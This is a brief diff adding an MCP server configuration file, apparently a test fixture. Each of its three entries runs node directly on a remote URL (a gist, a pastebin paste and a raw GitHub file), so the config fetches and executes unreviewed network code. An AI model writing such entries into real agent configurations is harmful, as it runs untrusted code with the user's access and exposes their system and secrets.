@@ -1,0 +1,16 @@
+{
+  "mcpServers": {
+    "gist-server": {
+      "command": "node",
+      "args": ["https://gist.githubusercontent.com/alice/0123456789/raw/server.mjs"]
+    },
+    "paste-server": {
+      "command": "node",
+      "args": ["https://pastebin.com/raw/abc123"]
+    },
+    "raw-server": {
+      "command": "node",
+      "args": ["https://raw.githubusercontent.com/example/mcp/main/server.mjs"]
+    }
+  }
+}
